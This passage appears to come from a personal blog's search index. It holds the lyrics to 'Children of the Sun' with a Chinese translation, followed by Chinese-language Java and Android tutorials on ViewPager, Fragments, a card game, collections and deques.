创造神物赐我天空生命 Wake up one day and find what we got is serious 它将苏醒 发觉人类所得已是荆棘 We are the children of the sun 我们 是太阳之后人 We are the children of the sun 我们 是太阳的子孙 The human creed and our creators well that we have to share 造物主与世间信条 总由天下共守 Weep deep in tragical fabrical issues everywhere 沦入满地悲惨琐碎 深藏泪水横流 Cannot replace the one, chase the one that we used to be 无法取代无法企及 无法重现往昔 It isn\u0026#39;t how we were, what we were, what we meant to be 不问起因不问本质 不问何为意义 Fighting and burning from turning from who we really are 对抗真我而被引燃 紧接回身躲避 Cannot suppress so let\u0026#39;s find the one we have shaped so far 再难压抑 追寻吾至今塑造之唯一 Flying too close to the sun as if we\u0026#39;re invincible 极尽距离逐日而去 仿佛无可匹敌 Cannot dictate our faith on the earth that we\u0026#39;re living on 不能左右心中信仰 脚下仍是土地 We are the children of the sun 我们 是太阳之后人 The love for everyone 爱会沐泽众生 Always on the run 一刻不停息 The fire in our eyes 烈焰在我眼中 The passion never dies 盛情永不暗淡 We\u0026#39;re the chosen ones 我们被选中 The children of the sun 为太阳的子孙 We are the children of the sun 我们 是太阳之后人 The love for everyone 爱会沐泽众生 Always on the run 一刻不停息 The fire in our eyes 烈焰在我眼中 The passion never dies 盛情永不暗淡 We\u0026#39;re the chosen ones 我们被选中 The children of the sun 为太阳的子孙 We are, we are we are the children of the sun 太阳，太阳，我们是太阳的后人 We are, we are the children of the sun 太阳，我们是太阳的子孙 We are, we are, we are the children(of the sun) 太阳，太阳，我们是太阳的后人 Always on the run 永远向前进 Reference https://www.youtube.com/watch?v=bpxtuUQ28UM ","permalink":"https://xhstormr.github.io/blog/posts/children-of-the-sun/","summary":"","title":"Children of the Sun"},{"content":"Updated on 2016-08-20\nViewPager 通常与 Fragment 搭配使用以实现页面导航。\nActivity public class MainActivity extends FragmentActivity implements ViewPager.OnPageChangeListener { ↳ 继承 v4 的 FragmentActivity @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); List\u0026lt;View\u0026gt; viewList = new ArrayList\u0026lt;\u0026gt;(); 页面数据源 View view1 = View.inflate(this, R.layout.view1, null); Layout ➜ View（上下文对象，布局文件，添加父容器） View view2 = View.inflate(this, R.layout.view2, null); View view3 = View.inflate(this, R.layout.view3, null); View view4 = View.inflate(this, R.layout.view4, null); viewList.add(view1); viewList.add(view2); viewList.add(view3); viewList.add(view4); List\u0026lt;android.support.v4.app.Fragment\u0026gt; fragmentList = new ArrayList\u0026lt;\u0026gt;(); 页面数据源 fragmentList.add(new MyFragment1()); fragmentList.add(new MyFragment2()); fragmentList.add(new MyFragment3()); fragmentList.add(new MyFragment4()); List\u0026lt;String\u0026gt; titleList = new ArrayList\u0026lt;\u0026gt;(); 标题数据源 titleList.add(\u0026#34;第一个页面\u0026#34;); titleList.add(\u0026#34;第二个页面\u0026#34;); titleList.add(\u0026#34;第三个页面\u0026#34;); titleList.add(\u0026#34;第四个页面\u0026#34;); ViewPager viewPager = (ViewPager) findViewById(R.id.viewPager); 1控件 MyPagerAdapter myPagerAdapter = new MyPagerAdapter(viewList, titleList); 2适配器 viewPager.setAdapter(myPagerAdapter); 3将控件与适配器绑定 MyFragmentPagerAdapter myFragmentPagerAdapter = new MyFragmentPagerAdapter(getSupportFragmentManager(), fragmentList, titleList); 2适配器 viewPager.setAdapter(myFragmentPagerAdapter); 3将控件与适配器绑定 ↳ 通过 v4 的 FragmentActivity 获得 SupportFragmentManager viewPager.addOnPageChangeListener(this); 监听页面滚动 viewPager.setCurrentItem(0); 页面跳转 PagerTabStrip tab = (PagerTabStrip) findViewById(R.id.tab); 修改标题栏 tab.setTextColor(Color.parseColor(\u0026#34;#daa520\u0026#34;)); 文字颜色 tab.setBackgroundColor(Color.parseColor(\u0026#34;#7fff00\u0026#34;)); 背景颜色 tab.setTabIndicatorColor(Color.parseColor(\u0026#34;#b22222\u0026#34;)); 标题栏颜色 tab.setDrawFullUnderline(false); 不显示下划线 } @Override public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) { } @Override public void onPageSelected(int position) { 位置从 0 开始 Toast.makeText(this, \u0026#34;第\u0026#34; + (position + 1) + \u0026#34;页\u0026#34;, Toast.LENGTH_SHORT).show(); } @Override public void onPageScrollStateChanged(int state) { } } Adapter PagerAdapter public class MyPagerAdapter extends PagerAdapter { 实现适配器 private List\u0026lt;View\u0026gt; viewList; 页面数据源 private List\u0026lt;String\u0026gt; titleList; 标题数据源 public MyPagerAdapter(List\u0026lt;View\u0026gt; viewList, List\u0026lt;String\u0026gt; titleList) { 构造方法 this.viewList = viewList; this.titleList = titleList; } @Override public int getCount() { 获得页面数量 return viewList.size(); } @Override public boolean isViewFromObject(View view, Object object) { 判断对象 Key 是否来自页面 return view == object; } @Override public Object instantiateItem(ViewGroup container, int position) { 实例化页面 container.addView(viewList.get(position)); return viewList.get(position); 返回判断对象 Key } @Override public void destroyItem(ViewGroup container, int position, Object object) { 销毁页面 container.removeView(viewList.get(position)); } @Override public CharSequence getPageTitle(int position) { 获得页面标题 return titleList.get(position); } } ------------------------------------------------------- 最多同时加载三个页面。 数据源：View（Layout） view1 ---- \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;TextView android:gravity=\u0026#34;center\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;第一个页面\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; Fragment(State)PagerAdapter public class MyFragmentPagerAdapter extends FragmentPagerAdapter { 实现适配器 private List\u0026lt;Fragment\u0026gt; fragmentList; 页面数据源 private List\u0026lt;String\u0026gt; titleList; 标题数据源 public MyFragmentPagerAdapter(FragmentManager fm, List\u0026lt;Fragment\u0026gt; fragmentList, List\u0026lt;String\u0026gt; titleList) { 构造方法 super(fm); this.fragmentList = fragmentList; this.titleList = titleList; } @Override public int getCount() { 获得页面数量 return fragmentList.size(); } @Override public Fragment getItem(int position) { 获得页面 return fragmentList.get(position); } @Override public CharSequence getPageTitle(int position) { 获得页面标题 return titleList.get(position); } } ------------------------------------------------------- 最多同时加载三个页面。 销毁： FragmentPagerAdapter：执行至 onDestroyView()。 FragmentStatePagerAdapter：执行至 onDetach()，完全销毁。 数据源：Fragment MyFragment1 ---- public class MyFragment1 extends android.support.v4.app.Fragment { 继承 v4 的 Fragment @Nullable @Override public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, Bundle savedInstanceState) { return inflater.inflate(R.layout.view1, container, false); Layout ➜ View } } Layout \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;android.support.v4.view.ViewPager android:id=\u0026#34;@+id/viewPager\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;\u0026gt; \u0026lt;android.support.v4.view.PagerTabStrip android:id=\u0026#34;@+id/tab\u0026#34; android:layout_gravity=\u0026#34;top\u0026#34; 标题位置 android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;\u0026gt; \u0026lt;/android.support.v4.view.PagerTabStrip\u0026gt; \u0026lt;/android.support.v4.view.ViewPager\u0026gt; \u0026lt;/LinearLayout\u0026gt; ------------------------------------------------------- PagerTabStrip：可点击标题跳转至对应页面。 PagerTitleStrip：不可交互。 ","permalink":"https://xhstormr.github.io/blog/posts/android-viewpager/","summary":"","title":"Android ViewPager"},{"content":"Updated on 2016-08-14\nFragmentManager findFragmentById() ⟺ findFragmentByTag()：获得 Fragment 对象。 addOnBackStackChangedListener()：添加监听回退栈变化的监听器。 popBackStack()：弹出回退栈，模拟用户按下返回按钮。 FragmentTransaction add() ⟺ remove()：onAttach()-onResume() ⟺ onPause()-onDetach() attach() ⟺ detach()：onCreateView()-onResume() ⟺ onPause()-onDestroyView() show() ⟺ hide()：不执行生命周期中的方法，仅仅是显示或隐藏。 replace()：销毁容器中所有的 Fragment，再添加一个指定的 Fragment。 创建 Fragment Fragment.java public class Fragment extends android.app.Fragment { 继承 Fragment @Nullable @Override public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, Bundle savedInstanceState) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 3onCreateView\u0026#34;); View view = inflater.inflate(R.layout.fragment, container, false); Layout ➜ View（布局文件，所在父容器，是否添加父容器） TextView textView = (TextView) view.findViewById(R.id.textView); textView.setText(\u0026#34;我是Fragment\u0026#34;); return view; 可返回 null，即不显示 UI } @Override public void onAttach(Activity activity) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 1onAttach\u0026#34;); super.onAttach(activity); } @Override public void onCreate(@Nullable Bundle savedInstanceState) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 2onCreate\u0026#34;); super.onCreate(savedInstanceState); } @Override public void onActivityCreated(@Nullable Bundle savedInstanceState) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 4onActivityCreated\u0026#34;); super.onActivityCreated(savedInstanceState); } @Override public void onStart() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 5onStart\u0026#34;); super.onStart(); } @Override public void onResume() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 6onResume\u0026#34;); super.onResume(); } @Override public void onPause() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 7onPause\u0026#34;); super.onPause(); } @Override public void onStop() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 8onStop\u0026#34;); super.onStop(); } @Override public void onDestroyView() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 9onDestroyView\u0026#34;); super.onDestroyView(); } @Override public void onDestroy() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 10onDestroy\u0026#34;); super.onDestroy(); } @Override public void onDetach() { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;Fragment ---\u0026gt; 11onDetach\u0026#34;); super.onDetach(); } } fragment.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;TextView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;New Text\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; 加载 Fragment 静态加载 main_activity.xml ⇳ \u0026lt;fragment android:name=\u0026#34;com.example.system.myapplication.Fragment\u0026#34; 加载的 Fragment 类 android:id=\u0026#34;@+id/MyFragment\u0026#34; 标识 Fragment android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; 动态加载 main_activity.xml ⇳ \u0026lt;LinearLayout 容器 android:id=\u0026#34;@+id/container\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;\u0026gt; \u0026lt;/LinearLayout\u0026gt; MainActivity.java ⇳ FragmentManager fragmentManager = getFragmentManager(); 获得 FragmentManager 对象 FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction(); 开启事务 fragmentTransaction.add(R.id.container, new Fragment(), \u0026#34;MyFragment\u0026#34;); 加载 Fragment（放置容器，加载的 Fragment 类，标识 Fragment） fragmentTransaction.addToBackStack(null); 添加事务至回退栈 fragmentTransaction.commit(); 提交事务 Fragment 通信 传入 不存在 ---- MainActivity.java ⇳ Fragment fragment = new Fragment(); Fragment Bundle bundle = new Bundle(); 数据包 bundle.putString(\u0026#34;data\u0026#34;, \u0026#34;数据传入\u0026#34;); 导入数据 fragment.setArguments(bundle); 导入数据包 FragmentManager fragmentManager = getFragmentManager(); 获得 FragmentManager 对象 FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction(); 开启事务 fragmentTransaction.add(R.id.container, fragment, \u0026#34;MyFragment\u0026#34;); 加载 Fragment fragmentTransaction.addToBackStack(null); 添加事务至回退栈 fragmentTransaction.commit(); 提交事务 Fragment.java ⇳ Bundle bundle = getArguments(); 获取数据包 String string = bundle.getString(\u0026#34;data\u0026#34;); 获取数据 已存在 ---- 接口 (MyListener.java) interface MyListener { void setText(String string); } MainActivity.java ⇳ Fragment fragmentById = fragmentManager.findFragmentById(R.id.MyFragment); 通过 ID 获得 Fragment 对象 ((MyFragment) fragmentById).setText(\u0026#34;数据传入\u0026#34;); 调用接口方法 Fragment fragmentByTag = fragmentManager.findFragmentByTag(\u0026#34;MyFragment\u0026#34;); 通过 Tag 获得 Fragment 对象 ((MyFragment) fragmentByTag).setText(\u0026#34;数据传入\u0026#34;); 调用接口方法 MyFragment.java implements MyListener ⇳ @Override public void setText(String string) { 实现接口方法 Toast.makeText(getActivity(), string, Toast.LENGTH_SHORT).show(); } ↳ 获得宿主 Activity 对象 传出 接口 (MyListener.java) interface MyListener { void setText(String string); } MainActivity.java implements MyListener ⇳ @Override public void setText(String string) { 实现接口方法 Toast.makeText(this, string, Toast.LENGTH_SHORT).show(); } Fragment.java ⇳ ((MyListener) getActivity()).setText(\u0026#34;数据传出\u0026#34;); 调用接口方法 ↳ 获得宿主 Activity 对象 ","permalink":"https://xhstormr.github.io/blog/posts/android-fragment/","summary":"","title":"Android Fragment"},{"content":"Updated on 2016-08-02\n分别创建了四个类：牌类(Card)、玩家类(Player)、方法类(Method)、入口类(Initial)\nCard.java class Card implements Comparable\u0026lt;Card\u0026gt; { String point; String suit; Integer pointWeight; Integer suitWeight; Card(String point, String suit, int pointWeight, int suitWeight) { this.point = point; this.suit = suit; this.pointWeight = pointWeight; this.suitWeight = suitWeight; } @Override public String toString() { return suit + point; } @Override public int compareTo(Card o) { int i = this.pointWeight.compareTo(o.pointWeight); switch (i) { case 1: return 1; case -1: return -1; case 0: return this.suitWeight.compareTo(o.suitWeight); default: return 0; } } } Player.java import java.util.ArrayList; import java.util.List; class Player { int id; String name; List\u0026lt;Card\u0026gt; cards; Player(int id, String name) { this.id = id; this.name = name; cards = new ArrayList\u0026lt;\u0026gt;(); } @Override public String toString() { return name + \u0026#34;：[\u0026#34; + cards.get(0) + \u0026#34;,\u0026#34; + cards.get(1) + \u0026#34;]\u0026#34;; } } Method.java import java.util.ArrayList; import java.util.Collections; import java.util.List; import java.util.Scanner; class Method { static List\u0026lt;Card\u0026gt; generateCards() { System.out.println(\u0026#34;---------开始洗牌-----------\u0026#34;); List\u0026lt;Card\u0026gt; cards = new ArrayList\u0026lt;\u0026gt;(); String[] suit = {\u0026#34;方片\u0026#34;, \u0026#34;梅花\u0026#34;, \u0026#34;红桃\u0026#34;, \u0026#34;黑桃\u0026#34;,}; String[] point = {\u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;10\u0026#34;, \u0026#34;J\u0026#34;, \u0026#34;Q\u0026#34;, \u0026#34;K\u0026#34;, \u0026#34;A\u0026#34;, \u0026#34;2\u0026#34;}; for (int i = 0; i \u0026lt; 4; i++) { for (int j = 0; j \u0026lt; 13; j++) { cards.add(new Card(point[j], suit[i], j, i)); } } Collections.shuffle(cards); getList(cards); System.out.println(\u0026#34;---------洗牌结束-----------\u0026#34;); return cards; } static List\u0026lt;Player\u0026gt; generatePlayer() { System.out.println(\u0026#34;---------玩家录入-----------\u0026#34;); List\u0026lt;Player\u0026gt; players = new ArrayList\u0026lt;\u0026gt;(); for (int i = 1; i \u0026lt; 3; i++) { System.out.println(\u0026#34;请输入第\u0026#34; + i + \u0026#34;位玩家的ID和姓名：\u0026#34;); while (true) { try { players.add(getPlayer()); break; } catch (Exception e) { System.out.println(\u0026#34;请输入整数类型的ID!\u0026#34;); } } } for (Player player : players) { System.out.println(\u0026#34;欢迎玩家：\u0026#34; + player.name); } System.out.println(\u0026#34;---------录入结束-----------\u0026#34;); return players; } static void startDeal(List\u0026lt;Card\u0026gt; cards, List\u0026lt;Player\u0026gt; players) { System.out.println(\u0026#34;---------开始发牌-----------\u0026#34;); for (int i = 0, j = 0; i \u0026lt; 2; i++) { for (Player player : players) { System.out.println(\u0026#34;玩家\u0026#34; + player.name + \u0026#34;拿牌\u0026#34;); player.cards.add(cards.get(j)); j++; } } System.out.println(\u0026#34;---------发牌结束-----------\u0026#34;); } static void startGame(List\u0026lt;Player\u0026gt; players) { System.out.println(\u0026#34;---------开始游戏-----------\u0026#34;); System.out.println(\u0026#34;玩家各自的手牌为：\u0026#34;); int cardNum = players.get(0).cards.size(); for (Player player : players) { Collections.sort(player.cards); System.out.println(player + \u0026#34;；最大手牌为：\u0026#34; + player.cards.get(cardNum - 1)); } int i = players.get(0).cards.get(cardNum - 1).compareTo(players.get(1).cards.get(cardNum - 1)); switch (i) { case 1: System.out.println(\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;玩家\u0026#34; + players.get(0).name + \u0026#34;获胜\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;); break; case -1: System.out.println(\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;玩家\u0026#34; + players.get(1).name + \u0026#34;获胜\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;); break; case 0: System.out.println(\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;平局\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;); break; } System.out.println(\u0026#34;---------游戏结束-----------\u0026#34;); } private static Player getPlayer() { Scanner scanner = new Scanner(System.in); System.out.print(\u0026#34;ID：\u0026#34;); int id = scanner.nextInt(); System.out.print(\u0026#34;姓名：\u0026#34;); String name = scanner.next(); return new Player(id, name); } private static void getList(List\u0026lt;Card\u0026gt; cards) { System.out.println(\u0026#34;共\u0026#34; + cards.size() + \u0026#34;张：\u0026#34;); int i = 0; for (Card card : cards) { System.out.print(card + \u0026#34;\\t\u0026#34;); i++; if (i % 13 == 0) { System.out.println(); } } } } Initial.java import java.util.List; class Initial { public static void main(String[] args) { List\u0026lt;Card\u0026gt; cards = Method.generateCards(); List\u0026lt;Player\u0026gt; players = Method.generatePlayer(); Method.startDeal(cards, players); Method.startGame(players); } } 实现效果 ","permalink":"https://xhstormr.github.io/blog/posts/java-poker/","summary":"","title":"通过 Java 实现扑克牌游戏"},{"content":"Updated on 2016-08-01\n集合：能够存储 任意数量 且具有 共同属性 的对象的 容器。 集合容量可变，数组容量固定。各自工具类：java.util.Collections | java.util.Arrays。 集合中的元素是任意类型的对象的引用，泛型则规定集合只能存放特定类型的对象。 集合存储的是对象的 引用，默认为 Object 类型，可通过泛型指定存入集合的对象类型（泛型的子类也可存入集合）。 基本数据类型可通过包装类转换成引用数据类型。 List. and Set. List\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;)); Arrays.asList() 将数组转化为 List String[] strings = {\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;}; 集合转数组 String[] ListToArray = new String[list.size()]; list.toArray(ListToArray); 增 ---- list.add(\u0026#34;A\u0026#34;); A B C A 加入集合 list.add(0, \u0026#34;A\u0026#34;); A A B C 插入集合 list.addAll(1, Arrays.asList(strings)); A 1 2 3 B C 插入集合 删 ---- list.remove(0); B C 删除集合中的对象 list.remove(string); B C 删除集合中的对象 String string = list.get(0) 获得对象的引用 list.removeAll(Arrays.asList(strings)); C 删除集合中的对象 String[] strings = {list.get(0), list.get(1)} 获得对象的引用并转换为 List 改 ---- list.set(1, \u0026#34;A\u0026#34;); A A C 修改集合中的对象 查 ---- list.get(0); 获得对象 A list.size(); 获得集合容量 list.indexOf(\u0026#34;A\u0026#34;) 0 索引对象，没有匹配对象则返回 -1 实现原理同 contains 方法 list.contains(\u0026#34;A\u0026#34;) true 是否包含该对象 该方法调用对象的 equals 方法进行比较；通过重写 equals 方法使其比较数据本身，而不是对象内存地址，以获得更好的扩展。 list.containsAll(Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;C\u0026#34;)) true 是否包含该对象 ⇳ HashSet 先比较 hashCode，再调用 equals 方法，所以还需要重写 hashCode 方法。 遍历集合 1 foreach for (String i : list) { System.out.println(i); } 2 迭代器 Iterator iterator = list.iterator(); 接收集合的迭代器 for (; iterator.hasNext(); ) { System.out.println(iterator.next()); } ------------------------------------------------------- Set\u0026lt;String\u0026gt; list = new HashSet\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;A\u0026#34;)); A B Set 是无序且不可重复的，所以不会有重复对象的引用，也不会含有具体位置的方法。 Map. Map 提供一种映射关系 ⟺ 键值对(Key,Value)，能够根据 Key 值快速查找 Value 值。 键值对以 Entry 类型的对象形式存在，其中的 Key 值无序且不可重复。 Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); 增 ---- map.put(1, \u0026#34;A\u0026#34;); 添加映射关系 删 ---- map.remove(1); 移除指定键的映射关系，同时返回映射值 (栈的 pop) map.clear(); 清空映射关系 改 ---- map.put(1, \u0026#34;B\u0026#34;); 覆盖已有的映射关系 查 ---- map.get(1); 获得指定键所映射的值 map.size(); 获得映射关系数 map.containsKey(1); true 是否包含该 Key 实现原理同 contains 方法 map.containsValue(\u0026#34;A\u0026#34;); true 是否包含该 Value 实现原理同 contains 方法 遍历 Map 1 entrySet 键 值 Set\u0026lt;Map.Entry\u0026lt;Integer, String\u0026gt;\u0026gt; entrySet = map.entrySet(); 接收包含 Entry 对象的 Set 集合 for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : entrySet) { System.out.println(entry.getKey() + \u0026#34; \u0026#34; + entry.getValue()); } 2 keySet 键 Set\u0026lt;Integer\u0026gt; keyset = map.keySet(); 接收包含 Key 的 Set 集合 for (int i : keyset) { System.out.println(i + \u0026#34; \u0026#34; + map.get(i)); } 3 values 值 Collection list = map.values(); 接收包含 Value 的 Collection 集合 for (Object i : list) { System.out.println(i); } List 排序 生成 10 个不重复的 10 位以内的随机字符串并排序输出 ---- public class A { private static List\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); public static void main(String[] args) { generateList(); Collections.sort(list); 排序集合 getList(); } private static void generateList() { 生成集合 String strings = \u0026#34;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#34;; String string = \u0026#34;\u0026#34;; Random random = new Random(); 实例化 Random for (int j = 0; j \u0026lt; 10; j++) { do { string = \u0026#34;\u0026#34;; 重置字符串 for (int i = 0, k = random.nextInt(10); i \u0026lt; k; i++) { random.nextInt(10) 返回 [0,10) 以内的随机整数 string += strings.charAt(random.nextInt(62)); } } while (list.contains(string)); 确保字符串不重复 list.add(string); } } private static void getList() { 遍历集合 int j = 0; for (String i : list) { System.out.println(\u0026#34;元素\u0026#34; + j + \u0026#34;：\u0026#34; + i); j++; } } } ---- 输出： 元素0：0CcjLX 元素1：DsJ9tF 元素2：ErW5sK59k 元素3：JuD 元素4：Q54tooYP 元素5：VVZ 元素6：dQStqTlKn 元素7：fwVv 元素8：pnY3c 元素9：ri6NDi Tips： 字符串比较规则： 数字：0-9 大写字母：A-Z 小写字母：a-z ------------------------------------------------------- 对自定义类进行排序 ---- public class A { private static List\u0026lt;Student\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(Arrays.asList(new Student(1, \u0026#34;CC\u0026#34;), new Student(2, \u0026#34;AA\u0026#34;), new Student(3, \u0026#34;BB\u0026#34;))); public static void main(String[] args) { Collections.sort(list); 使用默认比较规则，调用 compareTo，等同于 list.sort(null) getlist(); System.out.println(\u0026#34;---------\u0026#34;); Collections.sort(list, new Student()); 使用临时比较规则，调用 compare，等同于 list.sort(new Student()) getlist(); } private static void getlist() { for (Student i : list) { System.out.println(i.id + \u0026#34;:\u0026#34; + i.name); } } } class Student implements Comparable\u0026lt;Student\u0026gt;, Comparator\u0026lt;Student\u0026gt; { 实现接口 int id; String name; Student() { } Student(int id, String name) { this.id = id; this.name = name; } @Override public int compareTo(Student o) { 默认比较规则 return ((Integer) this.id).compareTo(o.id); 比较 id } @Override public int compare(Student o1, Student o2) { 临时比较规则 return o1.name.compareTo(o2.name); 比较 name } } ---- 输出： 1:CC 2:AA 3:BB --------- 2:AA 3:BB 1:CC Tips： 实现以下接口代表该类是可以比较大小的，可以进行自然排序： java.lang.Comparable 默认比较规则 compareTo(Object o) java.util.Comparator 临时比较规则 compare(Object o1, Object o2) 返回值： 0 相等 o1=o2 1 大于 o1\u0026gt;o2 -1 小于 o1\u0026lt;o2 ","permalink":"https://xhstormr.github.io/blog/posts/java-collection/","summary":"","title":"集合"},{"content":"Updated on 2017-04-12\n双端队列\n双端队列 API\n数据结构：相互之间存在一种或多种特定 关系 的数据元素的 集合。 队列（两个口）（Queue）：先进先出（FIFO, First In First Out），队头 ⟺ 队尾。 普通队列（劣），环形队列（优）。 堆栈（一个口）（Stack）：先进后出（LIFO, Last In First Out），栈顶 ⟺ 栈底。 push：数据入栈。 pop：数据出栈，并作为此函数的值返回该对象。 peek：查看栈顶部的对象，但不从栈中移除它。 empty：测试栈是否为空。 search：返回对象在栈中的位置。 双端队列 import java.util.ArrayDeque; public class A { private static ArrayDeque\u0026lt;Integer\u0026gt; deque = new ArrayDeque\u0026lt;\u0026gt;(); 双端队列（ArrayDeque 非线程安全，LinkedBlockingDeque 线程安全） public static void main(String[] args) { System.out.println(\u0026#34;队列\u0026#34;); deque.offerLast(1); deque.offerLast(2); deque.offerLast(3); deque.offerLast(4); show(); deque.offerLast(deque.pollFirst()); show(); deque.offerLast(deque.pollFirst()); show(); deque.offerLast(deque.pollFirst()); show(); deque.offerLast(deque.pollFirst()); show(); System.out.println(\u0026#34;————————\u0026#34;); deque.clear(); 清空双端队列 System.out.println(\u0026#34;堆栈\u0026#34;); deque.offerFirst(1); deque.offerFirst(2); deque.offerFirst(3); deque.offerFirst(4); show(); deque.offerFirst(deque.pollFirst()); show(); deque.offerFirst(deque.pollFirst()); show(); deque.offerFirst(deque.pollFirst()); show(); deque.offerFirst(deque.pollFirst()); show(); } private static void show() { deque.forEach(i -\u0026gt; System.out.print(i + \u0026#34; \u0026#34;)); System.out.println(); } } ---- 输出： 队列 1 2 3 4 2 3 4 1 3 4 1 2 4 1 2 3 1 2 3 4 ———————— 堆栈 4 3 2 1 4 3 2 1 4 3 2 1 4 3 2 1 4 3 2 1 import java.util.ArrayDeque; public class A { public static void main(String[] args) { String[] strs = new String[]{\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;}; ArrayDeque\u0026lt;String\u0026gt; deque = new ArrayDeque\u0026lt;\u0026gt;(); final int k = 2; for (String s : strs) { deque.addFirst(s); System.out.printf(space(k * deque.size()) + \u0026#34;\u0026lt;%s\u0026gt;\\n\u0026#34;, s); } for (int j = 0, n = deque.size(); j \u0026lt; n; j++) { System.out.printf(space(k * deque.size()) + \u0026#34;\u0026lt;/%s\u0026gt;\\n\u0026#34;, deque.removeFirst()); } } private static String space(int i) { StringBuilder sb = new StringBuilder(); for (int j = 0; j \u0026lt; i; j++) { sb.append(\u0026#34; \u0026#34;); } return sb.toString(); } } ---- 输出： \u0026lt;A\u0026gt; \u0026lt;B\u0026gt; \u0026lt;C\u0026gt; \u0026lt;/C\u0026gt; \u0026lt;/B\u0026gt; \u0026lt;/A\u0026gt; 固定顺序进栈，求出栈顺序总数 1 个元素进栈有 1 种出栈顺序，2 个元素进栈有 2 种出栈顺序，3 个元素进栈有 5 种出栈顺序\n把 n 个元素的出栈顺序数记为 f(n)，则对于 1、 2、 3 元素可得出：\nf(1) = 1 // 1 f(2) = 2 // 12、21 f(3) = 5 // 123、213、231、312、321 那么对于 f(4)，给其 4 个元素编号为 a，b，c，d；假设进栈顺序为 abcd，考虑出栈顺序元素 a 出现在1号位置、2号位置、3号位置、4号位置的情况：\na 在1号位置：只可能 a 进栈，再马上出栈；还剩 b，c，d，即子问题 f(3)。 a 在2号位置：有1个元素比 a 先出栈，即子问题 f(1)（只能是 b）；还剩 c，d，即子问题 f(2)；那么一共的顺序个数为 f(1) * f(2)。 a 在3号位置：有2个元素比 a 先出栈，即子问题 f(2)（只能是 b，c）；还剩 d，即子问题 